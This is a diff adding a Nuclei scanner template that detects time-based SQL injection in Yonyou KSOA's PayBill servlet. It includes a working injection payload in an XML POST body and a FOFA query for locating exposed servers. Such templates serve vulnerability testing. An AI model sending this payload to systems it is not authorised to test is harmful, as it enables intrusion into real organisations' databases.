@@ -1,0 +1,35 @@
+id: yonyou-ksoa-PayBill-sqli
+info:
+  name: 用友时空 KSOA PayBill - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://wiki.wy876.cn/#/%E6%9F%90%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA_PayBill_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="用友-时空KSOA"
+  tags: yonyou,sqli,ksoa,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16
+        Content-Length: 144
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1';WAITFOR DELAY '00:00:03';--+-</name><name>1</name><name>102360</name></root>
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+          - contains(body,'附近有语法错误')
+        condition: and
